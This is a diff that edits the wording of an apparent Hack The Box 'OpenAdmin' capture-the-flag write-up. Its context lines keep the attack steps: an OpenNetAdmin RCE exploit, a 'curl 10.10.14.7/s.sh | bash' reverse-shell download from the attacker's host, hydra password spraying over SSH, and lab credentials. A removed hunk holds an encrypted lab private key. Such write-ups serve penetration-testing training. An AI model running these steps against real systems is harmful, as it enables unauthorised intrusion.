@@ -21,7 +21,7 @@ In order to get root we have to abuse sudo privileges for the nano binary.
 # Information Gathering
 
 ## Nmap
-We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.
+We begin our enumeration by running Nmap to find open ports and enumerate services.
 
 ```console
 root@silence:~# nmap -sC -sV 10.10.10.171
@@ -41,7 +41,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 The only two open ports shown are **22** and **80**. SSH usually is not that interesting, so let's begin with http.
 
 ## HTTP - Port 80
-Going to https://10.10.10.171 we the default apache2 page is shown. To further enumerate the website, we'll start a gobuster.
+Going to https://10.10.10.171 the default apache2 page is shown. To further enumerate the website, we'll start a gobuster.
 
 ```console
 root@silence:~# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -64,14 +64,14 @@ Immediately after starting the gobuster we get a result returned.
 Going to /music this webpage is shown:
 
 ![/music webpage](/assets/htb/OpenAdmin/webpage-music.png)
-Checking out the links, Login directs to http://10.10.10.171/ona:
+Checking out the links, "Login" redirects to http://10.10.10.171/ona:
 
 ![OpenAdmin webpage](/assets/htb/OpenAdmin/webpage-ona.png)
 The website title suggests, that this website is running a software called "OpenNetAdmin". Furthermore, there is an alert, telling us, that the current version of this website (v18.1.1) is out of date.
 
 # Initial Shell - Exploiting OpenNetAdmin
 ## Finding RCE exploit
-Running searchsploit a RCE (remote code execution) vulnerability is revealed:
+Running searchsploit, a RCE (remote code execution) exploit is found:
 
 ```console
 root@silence:~# searchsploit "OpenNetAdmin"
@@ -108,7 +108,7 @@ root@silence:~# ./rse.sh
 $ whoami
 www-data
 ```
-Running the exploit we can verify code-execution by issuing a simple "whoami". Seems like we have code-execution in the context of the user "www-data". Let's get a shell next!
+Running the exploit, we can verify code-execution by issuing a simple "whoami". Seems like we have code-execution in the context of the user "www-data". Let's get a shell next!
 
 In order to evade bad characters and other issues, I am going to host the reverse shell with a python webserver and use the RCE to access and execute my payload.
 
@@ -131,7 +131,7 @@ $ which curl
 /usr/bin/curl
 $ curl 10.10.14.7/s.sh | bash
 ```
-With curl being installed, we can simply access the shell and directly pipe it into bash to execute the reverse-shell.
+With curl being installed, we can simply access the reverse-shell and directly pipe it into bash to execute it.
 
 `10.10.10.171 - - [02/May/2020 14:36:59] "GET /s.sh HTTP/1.1" 200 -`
 
@@ -189,7 +189,7 @@ joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 Seems like we have 3 possible users (actually 2, because root is rather unlikely) we can try to authenticate with the found password.
 
 ## Privesc to jimmy
-Of course we could try to su with our current reverse-shell, however Port 22 is open, so let's try SSH first. If this succeeds we get a much stabler shell and have some additional features like portforwarding or copying via scp.
+Of course we could try to su with our current reverse-shell, however Port 22 is open, so let's try SSH first. If this succeeds we get a much more stable shell and have some additional features like portforwarding or copying via scp.
 
 ```console
 root@silence:~# cat users.txt
@@ -201,7 +201,8 @@ root@silence:~# hydra -L users.txt -p 'n1nj4W4rri0R!' ssh://10.10.10.171
 [22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
 1 of 1 target successfully completed, 1 valid password found
 ```
-Using hydra we can quickly evaluate if any of the users on the system are allowed to login with the found password. Jimmy seems to be allowed to login via ssh with the password 'n1nj4W4rri0R!'.
+Using hydra we can quickly evaluate if any of the users on the system are allowed to login with the found password.
+Jimmy seems to be allowed to login via ssh with the password 'n1nj4W4rri0R!'.
 
 ```console
 ssh jimmy@10.10.10.171
@@ -229,7 +230,7 @@ tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
 ```
 Checking out all the ports listening on localhost only, the port **52846** stands out in particular.
 
-We can simply verify what's listening on the port, by connecting to it via nc and sending some junk data:
+We can simply verify what's running on the port, by connecting to it via nc and sending some junk data:
 ```console
 jimmy@openadmin:~$ nc 127.0.0.1 52846
 Test
@@ -310,46 +311,13 @@ Checking out index.php:
 ```
 Seems like the password is hardcoded! Let's use google and check if this hash is known...
 
-The password is "Revealed". It can be found [here](https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1).
+The password is "Revealed", as found [here](https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1).
 
-Using the creds (jimmy:Revealed) we can login successfully.
+Using the creds (jimmy:Revealed), we can login successfully.
 
 ![Internal main webpage](/assets/htb/OpenAdmin/webpage-internal-main.png)
 ### Cracking SSH private key
-The RSA private key seems interesting, so we'll save it to a file:
-```
-root@silence:~# cat joanna.key
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
-
-kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
-ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
-ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
-6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
-ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
-y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
-9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
-piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
-/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
-40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
-fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
-9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
-X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
-S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
-FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
-Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
-RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
-uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
-1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
-XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
-yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
-+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
-qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
-z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
-K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
------END RSA PRIVATE KEY-----
-```
+The RSA private key seems interesting, so we'll save it to a file.
 
 Using john we can extract and crack the hash of the rsa private-key:
 ```console
